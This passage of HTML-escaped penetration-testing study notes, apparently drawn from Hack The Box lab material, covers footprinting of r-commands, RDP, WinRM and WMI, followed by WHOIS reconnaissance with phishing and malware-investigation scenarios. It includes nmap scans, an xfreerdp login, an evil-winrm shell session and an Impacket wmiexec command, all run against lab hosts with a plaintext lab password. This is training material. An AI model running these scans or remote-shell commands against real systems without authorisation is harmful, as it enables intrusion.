  &lt;li&gt;rcp (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote copy&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;rexec (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote execution&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;rlogin (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote login&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;rsh (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote shell&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;rstat&lt;/li&gt;
  &lt;li&gt;ruptime&lt;/li&gt;
  &lt;li&gt;rwho (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;remote who&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Each command has its intended functionality; however, we will only cover the most commonly abused &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;r-commands&lt;/code&gt;. The table below will provide a quick overview of the most frequently abused commands, including the service daemon they interact with, over what port and transport method to which they can be accessed, and a brief description of each.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Command&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Service Daemon&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Port&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Transport Protocol&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rcp&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rshd&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;514&lt;/td&gt;
      &lt;td&gt;TCP&lt;/td&gt;
      &lt;td&gt;Copy a file or directory bidirectionally from the local system to the remote system (or vice versa) or from one remote system to another. It works like the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cp&lt;/code&gt; command on Linux but provides &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;no warning to the user for overwriting existing files on a system&lt;/code&gt;.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rsh&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rshd&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;514&lt;/td&gt;
      &lt;td&gt;TCP&lt;/td&gt;
      &lt;td&gt;Opens a shell on a remote machine without a login procedure. Relies upon the trusted entries in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts.equiv&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rhosts&lt;/code&gt; files for validation.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rexec&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rexecd&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;512&lt;/td&gt;
      &lt;td&gt;TCP&lt;/td&gt;
      &lt;td&gt;Enables a user to run shell commands on a remote machine. Requires authentication through the use of a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt; through an unencrypted network socket. Authentication is overridden by the trusted entries in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts.equiv&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rhosts&lt;/code&gt; files.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rlogin&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rlogind&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;513&lt;/td&gt;
      &lt;td&gt;TCP&lt;/td&gt;
      &lt;td&gt;Enables a user to log in to a remote host over the network. It works similarly to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; but can only connect to Unix-like hosts. Authentication is overridden by the trusted entries in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts.equiv&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rhosts&lt;/code&gt; files.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The /etc/hosts.equiv file contains a list of trusted hosts and is used to grant access to other systems on the network. When users on one of these hosts attempt to access the system, they are automatically granted access without further authentication.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 512,513,514 10.0.17.2

Starting Nmap 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-12-02 15:02 EST
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.17.2
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.11s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT    STATE SERVICE    VERSION
512/tcp open  &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;?
513/tcp open  login?
514/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;145.54 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;windows-remote-management-protocols&quot;&gt;Windows Remote Management Protocols&lt;/h1&gt;

&lt;p&gt;#evil-winrm #wsman #rdp&lt;/p&gt;

&lt;p&gt;Windows servers can be managed locally using Server Manager administration tasks on remote servers. Remote management is enabled by default starting with Windows Server 2016. Remote management is a component of the Windows hardware management features that manage server hardware locally and remotely. These features include a service that implements the WS-Management protocol, hardware diagnostics and control through baseboard management controllers, and a COM API and script objects that enable us to write applications that communicate remotely through the WS-Management protocol.&lt;/p&gt;

&lt;p&gt;The main components used for remote management of Windows and Windows servers are the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Remote Desktop Protocol (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDP&lt;/code&gt;)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Windows Remote Management (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt;)&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Windows Management Instrumentation (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WMI&lt;/code&gt;)&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;rdp&quot;&gt;RDP&lt;/h2&gt;

&lt;p&gt;The &lt;a href=&quot;https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol&quot;&gt;Remote Desktop Protocol&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RDP&lt;/code&gt;) is a protocol developed by Microsoft for remote access to a computer running the Windows operating system. This protocol allows display and control commands to be transmitted via the GUI encrypted over IP networks. RDP works at the application layer in the TCP/IP reference model, typically utilizing TCP port 3389 as the transport protocol. However, the connectionless UDP protocol can use port 3389 also for remote administration.&lt;/p&gt;

&lt;p&gt;For an RDP session to be established, both the network firewall and the firewall on the server must allow connections from the outside. If &lt;a href=&quot;https://en.wikipedia.org/wiki/Network_address_translation&quot;&gt;Network Address Translation&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NAT&lt;/code&gt;) is used on the route between client and server, as is often the case with Internet connections, the remote computer needs the public IP address to reach the server. In addition, port forwarding must be set up on the NAT router in the direction of the server.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote Desktop&lt;/code&gt; service is installed by default on Windows servers and does not require additional external applications. This service can be activated using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Manager&lt;/code&gt; and comes with the default setting to allow connections to the service only to hosts with &lt;a href=&quot;https://en.wikipedia.org/wiki/Network_Level_Authentication&quot;&gt;Network level authentication&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NLA&lt;/code&gt;).&lt;/p&gt;

&lt;h2 id=&quot;footprinting-the-service-1&quot;&gt;Footprinting the Service&lt;/h2&gt;

&lt;p&gt;Scanning the RDP service can quickly give us a lot of information about the host. For example, we can determine if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NLA&lt;/code&gt; is enabled on the server or not, the product version, and the hostname.&lt;/p&gt;

&lt;h4 id=&quot;nmap-2&quot;&gt;Nmap&lt;/h4&gt;

&lt;p&gt;Windows Remote Management Protocols&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; 10.129.201.248 &lt;span class=&quot;nt&quot;&gt;-p3389&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; rdp&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2021-11-06 15:45 CET
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.129.201.248
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.036s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-enum-encryption: 
|   Security layer
|     CredSSP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;NLA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: SUCCESS
|     CredSSP with Early User Auth: SUCCESS
|_    RDSTLS: SUCCESS
| rdp-ntlm-info: 
|   Target_Name: ILF-SQL-01
|   NetBIOS_Domain_Name: ILF-SQL-01
|   NetBIOS_Computer_Name: ILF-SQL-01
|   DNS_Domain_Name: ILF-SQL-01
|   DNS_Computer_Name: ILF-SQL-01
|   Product_Version: 10.0.17763
|_  System_Time: 2021-11-06T13:46:00+00:00
Service Info: OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;8.26 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;A Perl script named &lt;a href=&quot;https://github.com/CiscoCXSecurity/rdp-sec-check&quot;&gt;rdp-sec-check.pl&lt;/a&gt; has also been developed by &lt;a href=&quot;https://github.com/CiscoCXSecurity&quot;&gt;Cisco CX Security Labs&lt;/a&gt; that can unauthentically identify the security settings of RDP servers based on the handshakes.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;rdp-sec-check
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./rdp-sec-check.pl 10.129.201.248

Starting rdp-sec-check v0.9-beta &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; http://labs.portcullis.co.uk/application/rdp-sec-check/ &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at Sun Nov  7 16:50:32 2021

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Scanning 1 hosts

Target:    10.129.201.248
IP:        10.129.201.248
Port:      3389

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Checking supported protocols

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Checking &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;RDP Security &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PROTOCOL_RDP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Checking &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;TLS Security &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PROTOCOL_SSL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is supported...Not supported - HYBRID_REQUIRED_BY_SERVER
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Checking &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;CredSSP Security &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;PROTOCOL_HYBRID&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; is supported &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;uses NLA]...Supported

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Checking RDP Security Layer

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_NONE...Not supported
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_40BIT...Not supported
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_128BIT...Not supported
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_56BIT...Not supported
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] Checking RDP Security Layer with encryption ENCRYPTION_METHOD_FIPS...Not supported

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Summary of protocol support

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] 10.129.201.248:3389 supports PROTOCOL_SSL   : FALSE
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] 10.129.201.248:3389 supports PROTOCOL_HYBRID: TRUE
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] 10.129.201.248:3389 supports PROTOCOL_RDP   : FALSE

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Summary of RDP encryption support

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_NONE   : FALSE
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_40BIT  : FALSE
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_128BIT : FALSE
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_56BIT  : FALSE
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;-] 10.129.201.248:3389 supports ENCRYPTION_METHOD_FIPS   : FALSE

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Summary of security issues


rdp-sec-check v0.9-beta completed at Sun Nov  7 16:50:33 2021
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;initiate-an-rdp-session&quot;&gt;Initiate an RDP Session&lt;/h4&gt;

&lt;p&gt;#rdp #xfreerdp&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xfreerdp /u:cry0l1t3 /p:&lt;span class=&quot;s2&quot;&gt;&quot;P455w0rd!&quot;&lt;/span&gt; /v:10.129.201.248
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;winrm&quot;&gt;WinRM&lt;/h2&gt;

&lt;p&gt;#evil-winrm&lt;/p&gt;

&lt;p&gt;The Windows Remote Management (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRM&lt;/code&gt;) is a simple Windows integrated remote management protocol based on the command line. WinRM uses the Simple Object Access Protocol (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SOAP&lt;/code&gt;) to establish connections to remote hosts and their applications. Therefore, WinRM must be explicitly enabled and configured starting with Windows 10. WinRM relies on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5985&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5986&lt;/code&gt; for communication, with the last port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5986 using HTTPS&lt;/code&gt;, as ports 80 and 443 were previously used for this task. However, since port 80 was mainly blocked for security reasons, the newer ports 5985 and 5986 are used today.&lt;/p&gt;

&lt;p&gt;Another component that fits WinRM for administration is Windows Remote Shell (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WinRS&lt;/code&gt;), which lets us execute arbitrary commands on the remote system. The program is even included on Windows 7 by default. Thus, with WinRM, it is possible to execute a remote command on another server.&lt;/p&gt;

&lt;p&gt;Services like remote sessions using PowerShell and event log merging require WinRM. It is enabled by default starting with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows Server 2012&lt;/code&gt; version, but it must first be configured for older server versions and clients, and the necessary firewall exceptions created.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.129.201.248 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; Cry0l1t3 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; P455w0rD!

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint




Evil-WinRM PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\C&lt;/span&gt;ry0l1t3&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;wmi&quot;&gt;WMI&lt;/h2&gt;

&lt;p&gt;Windows Management Instrumentation (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WMI&lt;/code&gt;) is Microsoft’s implementation and also an extension of the Common Information Model (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIM&lt;/code&gt;), core functionality of the standardized Web-Based Enterprise Management (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WBEM&lt;/code&gt;) for the Windows platform. WMI allows read and write access to almost all settings on Windows systems. Understandably, this makes it the most critical interface in the Windows environment for the administration and remote maintenance of Windows computers, regardless of whether they are PCs or servers. WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WMIC&lt;/code&gt;). WMI is not a single program but consists of several programs and various databases, also known as repositories.&lt;/p&gt;

&lt;p&gt;**The initialization of the WMI communication always takes place on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP&lt;/code&gt; port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;135&lt;/code&gt;, and after the successful establishment of the connection, the communication is moved to a random port. For example, the program &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py&quot;&gt;wmiexec.py&lt;/a&gt; from the Impacket toolkit can be used for this.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:&lt;span class=&quot;s2&quot;&gt;&quot;P455w0rD!&quot;&lt;/span&gt;@10.129.201.248 &lt;span class=&quot;s2&quot;&gt;&quot;hostname&quot;&lt;/span&gt;

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; SMBv3.0 dialect used
ILF-SQL-01
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;web&quot;&gt;Web&lt;/h1&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Web Reconnaissance&lt;/code&gt; is the foundation of a thorough security assessment. This process involves systematically and meticulously collecting information about a target website or web application. Think of it as the preparatory phase before delving into deeper analysis and potential exploitation. It forms a critical part of the “&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Information Gathering&lt;/code&gt;” phase of the Penetration Testing Process.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;whois&quot;&gt;WHOIS&lt;/h1&gt;

&lt;p&gt;WHOIS is a widely used query and response protocol designed to access databases that store information about registered internet resources. Primarily associated with domain names, WHOIS can also provide details about IP address blocks and autonomous systems. Think of it as a giant phonebook for the internet, letting you look up who owns or is responsible for various online assets.&lt;/p&gt;

&lt;p&gt;WHOIS&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;whois inlanefreight.com

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
Domain Name: inlanefreight.com
Registry Domain ID: 2420436757_DOMAIN_COM-VRSN
Registrar WHOIS Server: whois.registrar.amazon
Registrar URL: https://registrar.amazon.com
Updated Date: 2023-07-03T01:11:15Z
Creation Date: 2019-08-05T22:43:09Z
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Each WHOIS record typically contains the following information:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain Name&lt;/code&gt;: The domain name itself (e.g., example.com)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registrar&lt;/code&gt;: The company where the domain was registered (e.g., GoDaddy, Namecheap)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registrant Contact&lt;/code&gt;: The person or organization that registered the domain.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Administrative Contact&lt;/code&gt;: The person responsible for managing the domain.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Technical Contact&lt;/code&gt;: The person handling technical issues related to the domain.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Creation and Expiration Dates&lt;/code&gt;: When the domain was registered and when it’s set to expire.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Name Servers&lt;/code&gt;: Servers that translate the domain name into an IP address.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;history-of-whois&quot;&gt;History of WHOIS&lt;/h2&gt;

&lt;p&gt;The history of WHOIS is intrinsically linked to the vision and dedication of &lt;a href=&quot;https://en.wikipedia.org/wiki/Elizabeth_J._Feinler&quot;&gt;Elizabeth Feinler&lt;/a&gt;, a computer scientist who played a pivotal role in shaping the early internet.&lt;/p&gt;

&lt;p&gt;In the 1970s, Feinler and her team at the Stanford Research Institute’s Network Information Center (NIC) recognised the need for a system to track and manage the growing number of network resources on the ARPANET, the precursor to the modern internet. Their solution was the creation of the WHOIS directory, a rudimentary yet groundbreaking database that stored information about network users, hostnames, and domain names.&lt;/p&gt;

&lt;p&gt;Click to expand on an interesting bit of internet history if you are interested&lt;/p&gt;

&lt;p&gt;why is so important…&lt;/p&gt;

&lt;h2 id=&quot;scenario-1-phishing-investigation&quot;&gt;Scenario 1: Phishing Investigation&lt;/h2&gt;

&lt;p&gt;An email security gateway flags a suspicious email sent to multiple employees within a company. The email claims to be from the company’s bank and urges recipients to click on a link to update their account information. A security analyst investigates the email and begins by performing a WHOIS lookup on the domain linked in the email.&lt;/p&gt;

&lt;p&gt;The WHOIS record reveals the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registration Date&lt;/code&gt;: The domain was registered just a few days ago.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registrant&lt;/code&gt;: The registrant’s information is hidden behind a privacy service.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Name Servers&lt;/code&gt;: The name servers are associated with a known bulletproof hosting provider often used for malicious activities.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This combination of factors raises significant red flags for the analyst. The analyst promptly alerts the company’s IT department to block the domain and warns employees about the scam.&lt;/p&gt;

&lt;h2 id=&quot;scenario-2-malware-analysis&quot;&gt;Scenario 2: Malware Analysis&lt;/h2&gt;

&lt;p&gt;A security researcher is analysing a new strain of malware that has infected several systems within a network. The malware communicates with a remote server to receive commands and exfiltrate stolen data. To gain insights into the threat actor’s infrastructure, the researcher performs a WHOIS lookup on the domain associated with the command-and-control (C2) server.&lt;/p&gt;

&lt;p&gt;The WHOIS record reveals:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registrant&lt;/code&gt;: The domain is registered to an individual using a free email service known for anonymity.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Location&lt;/code&gt;: The registrant’s address is in a country with a high prevalence of cybercrime.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Registrar&lt;/code&gt;: The domain was registered through a registrar with a history of lax abuse policies.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Based on this information, the researcher concludes that the C2 server is likely hosted on a compromised or “bulletproof” server. The researcher then uses the WHOIS data to identify the hosting provider and notify them of the malicious activity.&lt;/p&gt;

